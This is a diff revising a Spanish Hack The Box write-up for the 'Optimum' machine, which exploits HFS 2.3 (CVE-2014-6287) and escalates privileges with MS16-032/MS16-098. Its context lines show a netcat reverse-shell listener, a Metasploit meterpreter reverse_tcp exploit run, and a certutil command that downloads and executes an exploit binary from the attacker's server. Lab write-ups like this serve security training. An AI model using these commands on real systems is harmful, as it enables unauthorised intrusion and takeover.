@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Optimum - Hack The Box
-excerpt: "La máquina Optimum, bastante sencilla con algunas formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario, y para escalar privilegios, utilice el Exploit MS16-032 y MS16-098."
+excerpt: "La máquina Optimum, bastante sencilla con varias formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario, y para escalar privilegios utilice el Exploit MS16-032 y MS16-098."
 date: 2023-02-16
 classes: wide
 header:
@@ -15,26 +15,35 @@ tags:
   - Windows
   - Http File Server (HFS)
   - Remote Command Execution (RCE)
-  - RCE - CVE-2014-6287
+  - CVE-2014-6287 (RCE)
   - System Recognition (Windows)
   - Local Privilege Escalation (LPE)
-  - LPE - MS16-098
-  - LPE - MS16-032
+  - Privesc - MS16-098 (LPE)
+  - Privesc - MS16-032 (LPE)
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-optimum/optimum_logo.png)
-La máquina Optimum, bastante sencilla con algunas formas para poder vulnerarla, en mi caso use el **CVE-2014-6287** para poder acceder a la máquina como usuario, y para escalar privilegios, utilice el **Exploit MS16-032** y **MS16-098**.
+
+La máquina Optimum, bastante sencilla con varias formas para poder vulnerarla, en mi caso use el **CVE-2014-6287** para poder acceder a la máquina como usuario, y para escalar privilegios utilice el **Exploit MS16-032** y **MS16-098**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *whatweb*
+* *searchsploit*
+* *locate*
 * *nc*
 * *python2*
 * *certutil.exe*
 * *python3*
+* *git*
+* *pip2*
 * *windows-exploit-suggester.py*
-* *metasploit framework*
+* *metasploit framework(msfconsole)*
+* *Módulo: windows/http/rejetto_hfs_exec*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *Módulo: exploit/windows/local/ms16_032_secondary_logon_handle_privesc*
 
 
 <br>
@@ -76,10 +85,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -169,10 +175,7 @@ Esta usando el servicio HFS, vamos a investigarlo y de paso, analicemos la pági
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -217,10 +220,7 @@ Afortunadamente, ya tenemos la versión que se esta ocupando y es la versión **
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -311,7 +311,7 @@ python2 HFS_Exploit.py 10.10.10.8 80
 ```bash
 nc -nvlp 443                       
 listening on [any] 443 ...
-connect to [10.10.14.12] from (UNKNOWN) [10.10.10.8] 49162
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.8] 49162
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 C:\Users\kostas\Desktop>whoami
@@ -320,7 +320,7 @@ optimum\kostas
 ```
 
 * Justamente entramos como un usuario y en su escritorio, entonces ahí mismo está la flag del usuario:
-```bash
+```batch
 C:\Users\kostas\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -334,7 +334,7 @@ dir
                2 Dir(s)   5.673.574.400 bytes free
 C:\Users\kostas\Desktop>type user.txt
 type user.txt
-34cbd67f90f2fa85416b39f6fb55cfbc
+...
 ```
 Excelente, ahora vamos a probar la versión con **Metasploit Framework**.
 
@@ -346,11 +346,10 @@ Vamos a iniciar la herramientas **Metasploit Framework**, buscaremos los Exploit
 
 Hagamoslo por pasos:
 
-* Iniciando Metasploit:
+* Iniciando **Metasploit**:
 
 ```bash
 msfconsole
-.
  ______________________________________
 / it looks like you're trying to run a \                                                                                                                                                                                                   
 \ module                               /                                                                                                                                                                                                   
@@ -366,8 +365,7 @@ msfconsole
     || ||                                                                                                                                                                                                                                  
     |\_/|                                                                                                                                                                                                                                  
     \___/                                                                                                                                                                                                                                  
-.                                                                                                                                                                                                                                           
-.
+*
        =[ metasploit v6.3.4-dev                           ]
 + -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
 + -- --=[ 968 payloads - 45 encoders - 11 nops            ]
@@ -383,18 +381,16 @@ Metasploit Documentation: https://docs.metasploit.com/
 
 ```bash
 msf6 > search hfs 2.3
-.
+*
 Matching Modules
 ================
-.
    #  Name                                        Disclosure Date  Rank       Check  Description
    -  ----                                        ---------------  ----       -----  -----------
    0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
    1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
-.
-.
+*
 Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
-.
+*
 msf6 > use exploit/windows/http/rejetto_hfs_exec
 *] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/http/rejetto_hfs_exec) >
@@ -413,7 +409,7 @@ LHOST => Tu_IP
 msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
 .
 [*] Started reverse TCP handler on Tu_IP:4444 
-[*] Using URL: http://10.10.14.35:8080/SUxJCT
+[*] Using URL: http://Tu_IP:8080/SUxJCT
 [*] Server started.
 [*] Sending a malicious request to /
 [*] Payload request received: /SUxJCT
@@ -448,10 +444,7 @@ Esta fue una forma muy sencilla para ganar acceso a la máquina.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -459,7 +452,7 @@ Esta fue una forma muy sencilla para ganar acceso a la máquina.
 <h2 id="PostEnum">Enumeración de Máquina</h2>
 
 Veamos que permisos tenemos y quizá con eso podamos convertirnos en Root o en este caso como **NT Authority System**.
-```shell
+```batch
 C:\Users\kostas\Desktop>whoami /priv
 whoami /priv
 
@@ -473,7 +466,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
 No estoy del todo seguro de que podamos aprovecharnos de ese privilegio, así que mejor veamos que version de Windows corre la máquina:
-```shell
+```batch
 C:\Users\kostas\Desktop>systeminfo 
 systeminfo
 
@@ -489,7 +482,7 @@ La máquina usa **Windows 2012 6.3.9600 N/A Build 9600**, busquemos un Exploit p
 
 La herramienta **Windows Exploit Suggester** nos va a ayudar a encontrar los Exploits a los que es vulnerable la máquina, únicamente debemos pasarle un fichero que almacene toda la información que nos dé el comando **systeminfo** de la máquina víctima, primero vamos a descargar esta herramienta:
 
-* https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+* Clona el repo: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">Repositorio de AonCyberLabs: Windows Exploit Suggester</a>
 ```bash
 git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
 Clonando en 'Windows-Exploit-Suggester'...
@@ -523,11 +516,9 @@ IMPORTANTE, a la primera no me sirvió, por lo que tuve que instalar otra cosa:
 pip2 install xlrd==1.2.0
 ```
 Aquí viene ese problema:
-
-* https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/
+* <a href="https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/" target="_blank">Windows-Exploit-Suggester Error</a>
 
 Ahora sí, usemos el **suggester**:
-
 ```shell
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
@@ -561,25 +552,25 @@ Papers: No Results
 ```
 El Exploit esta hecho en **C**. Si analizamos el contenido del Exploit, arriba vienen adjuntos dos links, uno con información sobre este Exploit y otro con el que podremos descargar un ejecutable de dicho Exploit, descárgalo.
 
-Después de descárgarlo, vamos a meterlo a la máquina, para esto usaremos **certutil.exe** como en otras máquinas con Windows.
+Después de descárgarlo, vamos a meterlo a la máquina, para esto usaremos **certutil.exe** como en otras máquinas con **Windows**.
 
 Muy bien, hagámoslo por pasos:
 
-* Levantamos un servidor con Python en donde este el Exploit ejecutable:
+* Levantamos un servidor con **Python** en donde este el Exploit ejecutable:
 ```bash
 python3 -m http.server                                                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 * Nos metemos a la **directorio /Temp** y creamos un directorio nuevo, lo llamaremos **privesc**:
-```shell
+```batch
 C:\Users\kostas\Desktop>cd C:\Windows/Temp
 mkdir Privesc
 cd Privesc
 ```
 
 * Y dentro de la máquina usamos la **herramienta certutil.exe**:
-```shell
+```batch
 C:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
 certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
 ****  Online  ****
@@ -589,7 +580,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 * Verificamos si está el Exploit:
-```shell
+```batch
 C:\Windows\Temp\Privesc>dir
 dir
  Volume in drive C has no label.
@@ -603,7 +594,7 @@ dir
 ```
 
 * Y lo activamos:
-```shell
+```batch
 C:\Windows\Temp\Privesc>Exploit.exe
 Exploit.exe
 Microsoft Windows [Version 6.3.9600]
@@ -625,33 +616,29 @@ Vamos por pasos:
 
 ```bash
 msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester
-.
+*
 Matching Modules
 ================
-.
    #  Name                                      Disclosure Date  Rank    Check  Description
    -  ----                                      ---------------  ----    -----  -----------
    0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
-.
-.
+*
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
-.
+*
 msf6 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
 msf6 post(multi/recon/local_exploit_suggester) >
 ```
 
 * Configurando **módulo Suggester**:
-
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > sessions
-.
+*
 Active sessions
 ===============
-.
   Id  Name  Type                     Information               Connection
   --  ----  ----                     -----------               ----------
   1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  Tu_IP:4444 -> 10.10.10.8:49162 (10.10.10.8)
-.
+*
 msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
 SESSION => 1
 ```
@@ -668,7 +655,6 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
 [*] Running check method for exploit 41 / 41
 [*] 10.10.10.8 - Valid modules for session 1:
 ============================
-.
  #   Name                                                           Potentially Vulnerable?  Check Result
  -   ----                                                           -----------------------  ------------
  1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
@@ -781,11 +767,9 @@ Y listo, con esto hemos completado esta máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://www.google.com/search?client=firefox-b-e&q=HFS+2.3+exploit
 * https://www.exploit-db.com/exploits/39161
@@ -802,3 +786,48 @@ Y listo, con esto hemos completado esta máquina.
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
